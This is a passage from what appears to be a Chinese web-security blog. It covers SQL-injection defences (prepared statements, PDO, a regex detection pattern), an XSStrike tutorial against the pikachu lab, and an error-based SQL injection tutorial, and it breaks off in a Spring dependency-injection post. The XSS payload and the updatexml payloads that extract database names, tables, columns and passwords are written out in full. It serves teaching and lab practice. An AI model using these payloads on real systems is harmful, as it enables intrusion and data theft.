<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select id, no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1, id);</span><br><span class="line">ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会<strong>影响该SQL语句的语法结构了</strong>，因为<strong>语法分析已经完成了</strong>，而语法分析<strong>主要是分析SQL命令</strong>，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面<strong>输入了这些SQL命令</strong>，<strong>也不会被当成SQL命令来执行了</strong>，因为这些SQL命令的执行， 必须先通过<strong>语法分析</strong>，生成<strong>执行计划</strong>，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句<strong>预编译</strong>可以有效防御SQL注入。</p>
<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
<h3 id="PDO（PHP）"><a href="#PDO（PHP）" class="headerlink" title="PDO（PHP）"></a>PDO（PHP）</h3><p>首先简单介绍一下什么是<strong>PDO</strong>。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组<strong>数据库抽象层</strong>API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
<p>PDO对于解决SQL注入的原理也是<strong>基于预编译</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">$data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br></pre></td></tr></table></figure>

<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了<strong>占位符的方式</strong>，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以<strong>防止传那些危险变量</strong>改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p>
<h3 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h3><p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p>
<p>对用户输入的特殊字符进行严格过滤，如 ‘、”、&lt;、&gt;、&#x2F;、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(</span><br><span class="line">r&quot;(%27)|(\&#x27;)|(\-\-)|(%23)|(#)|&quot;  # Regex for detection of SQL meta-characters</span><br><span class="line">r&quot;\w*((%27)|(\&#x27;))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;  # Modified regex for detection of SQL meta-characters eg: &#x27; or 1 = 1&#x27; detect word &#x27;or&#x27;,</span><br><span class="line">r&quot;((%3D)|(=))[^\n]*((%27)|(\&#x27;)|(\-\-)|(%3B)|(;))&quot;  # Regex for typical SQL Injection attack eg: &#x27;= 1 --&#x27;</span><br><span class="line">r&quot;((%27)|(\&#x27;))union|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))select|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))insert|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))update|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))drop&quot;,  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line">r = pattern.search(&quot;&#x27; OR 1 -- -&quot;)</span><br><span class="line">if r:</span><br><span class="line">return True</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Web 应用中用于<strong>连接数据库的用户</strong>与<strong>数据库的系统管理员用户</strong>的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p>
<p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
<p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p>
<p>使用 Web 应用防火墙。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="cmawczpoe0036ik7k1hi8aejz" data-title="SQL注入总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/工具使用/xsstrike/使用教程/实战" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/">XSStrike实战教程</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="XSStrike的基本使用"><a href="#XSStrike的基本使用" class="headerlink" title="XSStrike的基本使用"></a>XSStrike的基本使用</h1><p>下面是他的常用命令</p>
<ul>
<li>-u url</li>
<li>–skip 跳过确认提示</li>
<li>–skip-dom 跳过dom型扫描</li>
<li>–data post型时的数据</li>
</ul>
<p>这里我们使用pikachu平台进行测试</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p><img src="/.com//image-20250520023352-uo3hi74.png" alt="image"></p>
<p>这是最简单的，我们先手动submit一下看看url</p>
<p><img src="/.com//image-20250520023402-255gf3e.png" alt="image"></p>
<p>直接写payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=k123&amp;submit=submit&quot;</span> --skip --skip-dom</span><br></pre></td></tr></table></figure>

<p>这就是根据刚刚的基本命令写的，最后两个参数就是跳过确认提示和跳过dom型扫描，因为已经说了是反射型了</p>
<p><img src="/.com//image-20250520023415-vfrekc7.png" alt="image">​</p>
<p>因为这个是最简单的xss所以有很多的payload，列出的payload都是成功的</p>
<p>比如第一个(注意payload包括括号)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.211.55.4/pikachu-master/vul/xss/xss_reflected_get.php?message=%3CdEtaIls/+/ontoggLE+=+[8].find(confirm)%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250520023440-tiuzgl6.png" alt="image"></p>
<p>点击详细信息就会弹窗（safari浏览器弹不了，只能用谷歌）</p>
<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><hr>
<p>这个是需要登陆的，所以需要拿cookie</p>
<p><img src="/.com//image-20250520023454-xfhhd3j.png" alt="image"></p>
<p>这里传的参是通过post传的，所以还需要拿post</p>
<p>获取post可以抓包获取，也可以直接看请求</p>
<p><img src="/.com//image-20250520023501-fcokexp.png" alt="image"></p>
<p>点一下view source看完整的</p>
<p><img src="/.com//image-20250520023508-ywgokzv.png" alt="image"></p>
<p>这就是post请求了，然后再找cookie</p>
<p><img src="/.com//image-20250520023515-lv1zzz7.png" alt="image"></p>
<p>可以在控制台输入document.cookie来获取cookie</p>
<p>现在有了post请求和cookie就可以使用软件了</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xsspost/xss_reflected_post.php&quot;</span> --data <span class="string">&quot;message=1&amp;submit=submit&quot;</span> --headers <span class="string">&quot;Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ik287bd9bniuabdun1psescmr3&quot;</span></span><br></pre></td></tr></table></figure></blockquote>
<p>要注意格式，需要自己添加Cookie:然后这后面又个空格</p>
<p><img src="/.com//image-20250520023535-u7joe1g.png" alt="image"></p>
<p>用第一个payload试一试</p>
<p><img src="/.com//image-20250520023542-25jl455.png" alt="image"></p>
<p>配合hackbar发送</p>
<p><img src="/.com//image-20250520023550-3xuog8w.png" alt="image"><img src="/.com//image-20250520023553-0kxick2.png" alt="image"></p>
<p>鼠标移动上去就弹窗</p>
<hr>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="/.com//image-20250520023610-8smbq12.png" alt="image"></p>
<p>这也是post发送的</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_stored.php&quot;</span> <span class="params">--data</span> <span class="string">&quot;message=1&amp;submit=submit&quot;</span> <span class="params">--skip-dom</span> <span class="params">--skip</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250520023623-pjrutwo.png" alt="image"></p>
<p>因为这是存储的，所以它测试的时候会不断传进去，及时按ctrl+c停止</p>
<p><img src="/.com//image-20250520023631-8diah4y.png" alt="image"><img src="/.com//image-20250520023634-zrbz4a5.png" alt="image"></p>
<hr>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>这个用XSStrike做不出来，如果有人可以做出来欢迎补充</p>
<hr>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="/.com//image-20250520023650-yn41p64.png" alt="image"></p>
<p>通过get传参并且有回显，直接跑</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> xsstrike.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_01.php?message=13&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250520023703-qk66wlr.png" alt="image"></p>
<p><img src="/.com//image-20250520023714-ujyvkd4.png" alt="image"><img src="/.com//image-20250520023717-tqnkd4v.png" alt="image"></p>
<hr>
<h2 id="XSS之HTML特殊字符"><a href="#XSS之HTML特殊字符" class="headerlink" title="XSS之HTML特殊字符"></a>XSS之HTML特殊字符</h2><p>这题用工具跑出来的payload用不了，会被转义</p>
<p>还是手动好</p>
<hr>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/.com//image-20250520023740-4kqh3ql.png" alt="image"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u <span class="string">&quot;http://10.211.55.4/pikachu-master/vul/xss/xss_03.php?message=123&amp;submit=submit&quot;</span> --skip</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250520023750-d85dkno.png" alt="image"></p>
<p><img src="/.com//image-20250520023753-b9ptlcx.png" alt="image"></p>
<hr>
<h2 id="XSS之href输出-1"><a href="#XSS之href输出-1" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>这题也不能靠工具</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" data-id="cmawczpoi003rik7khqv7ceuh" data-title="XSStrike实战教程" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/报错注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL报错注入技术</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h3 id="报错注入常用的函数"><a href="#报错注入常用的函数" class="headerlink" title="报错注入常用的函数"></a>报错注入常用的函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">floor()</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line"></span><br><span class="line">updatexml()</span><br><span class="line"></span><br><span class="line">geometrycollection()</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">.。。。。。</span><br><span class="line"></span><br><span class="line">这里介绍一个案例updatexml()。</span><br></pre></td></tr></table></figure>

<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>MySQL提供了一个<code>updatexml()</code>​函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
<p>我们尝试在查询用户id的同时，使用报错函数，在地址栏输入：<code>?id=1&#39; and updatexml(1, 0x7e, 3) -- a</code>​</p>
<p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p>
<p><img src="/.com//image-20250519092815-g702fvt.png" alt="image"></p>
<p>​<code>version()</code>​：返回数据库版本<code>concat()</code>​：拼接特殊符号和查询结果</p>
<p>​<code>updatexml()</code>​函数的报错内容长度不能超过32个字符，常用的解决方式有两种：</p>
<ol>
<li>​<code>limit</code>​：分页</li>
<li>​<code>substr()</code>​：截取字符</li>
</ol>
<hr>
<h4 id="1-1-limit分页"><a href="#1-1-limit分页" class="headerlink" title="1.1 limit分页"></a>1.1 limit分页</h4><p>例如，已知users表中包含username和password两个字段，显示出某个password字段的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1, concat(0x7e,(select password from users limit 0,1)), 3) -- a</span></span><br></pre></td></tr></table></figure>

<p>使用<code>group_concat(字段名)</code>​显示出最高32位字符长度，password字段的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; and updatexml(1, concat(0x7e,(select group_concat(password) from users limit 0,1)), 3) -- a</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-substr"><a href="#1-2-substr" class="headerlink" title="1.2 substr()"></a>1.2 substr()</h4><p>适用情况：页面有数据库报错信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.网站信息必须是动态的，来自数据库的报错信息。</span><br><span class="line">2.网站写死的、自定义的报错信息不算</span><br></pre></td></tr></table></figure>

<p>1.判断是否报错</p>
<p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; -- a</span><br></pre></td></tr></table></figure>

<p>2.判断报错条件</p>
<p>参数中添加报错函数，检查报错信息是否正常回显。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,&#x27;~&#x27;,3) -- a </span><br></pre></td></tr></table></figure>

<ol start="3">
<li>脱库</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取所有数据库</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(schema_name) from information_schema.schemata),1,31)),3) -- qwq </span><br><span class="line"></span><br><span class="line">//获取所有表</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(table_name) from information_schema.tables where table_schema =&#x27;security&#x27;),1,31)),3) -- qwq</span><br><span class="line"></span><br><span class="line">//获取所有字段</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr((select group_concat(column_name) from information_schema.columns where table_schema =&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,31)),3) -- qwq</span><br></pre></td></tr></table></figure>

<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawczpoq0049ik7k89zzd8hd" data-title="SQL报错注入技术" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/反序列化/反序列化详解/对象注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/">反序列化对象注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h1><h3 id="一，实现方式的使用"><a href="#一，实现方式的使用" class="headerlink" title="一，实现方式的使用"></a>一，实现方式的使用</h3><p>对象注入也可被称为对象装配，是把Bean对象获取出来放到某个类中。</p>
<p>对象注入的实现方式有3种，分别为<strong>属性注入</strong>，<strong>Setter注入</strong>和<strong>构造方法注入</strong>。</p>
<p>为了更好地理解对象注入的实现方式，搞个实例来具体说明：</p>
<h4 id="1-0，前期准备"><a href="#1-0，前期准备" class="headerlink" title="1.0，前期准备"></a>1.0，前期准备</h4><p><strong>1，准备Service类</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class StudentService &#123;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student service sayHi()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例问题：将 Service 类注入到 Controller 类中，对象注入实现：</p>
<h4 id="1-1，属性注入"><a href="#1-1，属性注入" class="headerlink" title="1.1，属性注入"></a>1.1，属性注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    //注入方式：属性注入</span><br><span class="line">    @Autowired</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3，启动类执行结果：</strong></p>
<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
<h4 id="1-2，Setter注入"><a href="#1-2，Setter注入" class="headerlink" title="1.2，Setter注入"></a>1.2，Setter注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public void setStudentService(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2，启动类实现代码：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //1，获取Spring上下文</span><br><span class="line">        ApplicationContext applicationContext =</span><br><span class="line">                new ClassPathXmlApplicationContext(<span class="string">&quot;spring-config.xml&quot;</span>);</span><br><span class="line">        //2,得到Bean对象</span><br><span class="line">        StudentController studentController =</span><br><span class="line">                applicationContext.getBean(<span class="string">&quot;studentController&quot;</span>,StudentController.class);</span><br><span class="line">        //3,使用Bean对象</span><br><span class="line">        studentController.sayHi();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3，启动类执行结果：</strong></p>
<p><img src="/.com//image-20250519113413-r3ei7ob.png" alt="image"></p>
<h4 id="1-3，构造方法注入"><a href="#1-3，构造方法注入" class="headerlink" title="1.3，构造方法注入"></a>1.3，构造方法注入</h4><p><strong>1，方式对应实现的Controller 类代码：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Controller</span><br><span class="line">public class StudentController &#123;</span><br><span class="line">    private StudentService studentService;</span><br><span class="line">    @Autowired</span><br><span class="line">    public StudentController(StudentService studentService) &#123;</span><br><span class="line">        this.studentService = studentService;</span><br><span class="line">    &#125;</span><br><span class="line">    public void <span class="function"><span class="title">sayHi</span></span>()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;do student controller sayHi()&quot;</span>);</span><br><span class="line">        studentService.sayHi();</span><br><span class="line">    